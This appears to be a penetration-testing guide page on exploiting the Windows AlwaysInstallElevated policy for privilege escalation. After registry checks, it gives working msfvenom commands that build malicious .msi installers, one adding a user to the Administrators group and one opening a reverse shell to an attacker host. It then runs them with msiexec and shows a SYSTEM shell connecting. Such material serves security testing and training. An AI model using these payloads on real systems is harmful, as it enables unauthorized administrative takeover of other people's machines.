# Always Install Elevated

In Windows, there is a policy that forces Microsoft installer packages (`.msi`) to always install with maximum privileges. If this policy is enabled, an attacker can perform privileged installations by using a file containing malicious code to escalate privileges.

### Verification

To check if this policy is enabled, verify that the registry key is set to 1 using the following commands:

```powershell
if ((Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated -eq 1) {
    echo "VULNERABLE!"
}

if ((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated -eq 1) {
    echo "VULNERABLE!"
}
```

You can also manually check with CMD:

```batch
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Attack

If the registry key is set to 1, the policy is active and the system is vulnerable. An attacker can create a malicious `.msi` package. One straightforward method is to use `msfvenom` from Metasploit to either add your user to the Administrators group or open a high-integrity reverse shell.

```bash
# Create a new administrative user
msfvenom -p windows/exec CMD="net localgroup administrators [user] /add" -f msi -o toadmin.msi

# Create a reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=4444 -f msi -o rev.msi
```

Finally, execute the malicious package with:

```powershell
msiexec /i rev.msi
```

## Example

First, copy and paste the script below to check the registry key for the policy.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/others/always_1.png)

The output indicates the system is vulnerable. Next, create a `.msi` package with a reverse shell:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=4444 -f msi -o rev.msi
```

Finally, initiate the installation of the package, which will run as SYSTEM.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/others/always_2.png)

Within a few seconds, the reverse shell connects, executing as SYSTEM.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/others/always_3.png)
